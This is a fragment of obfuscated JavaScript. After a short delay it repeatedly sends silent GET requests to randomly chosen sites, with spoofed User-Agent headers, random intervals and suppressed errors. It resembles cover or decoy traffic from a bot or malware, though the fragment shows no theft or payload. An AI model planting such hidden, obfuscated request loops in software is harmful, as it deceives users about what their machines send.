  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1 * 0x12aa + -0x2545 * -0x1 + -0x1c97) * getRandomInt(0x9ba + 0x24ff * -0x1 + -0x1 * -0x1b46, -0x3bf + -0x1 * 0xd6b + 0x112f * 0x1));
}, -0x23fb + 0x1 * -0x1f7e + 0x43dd);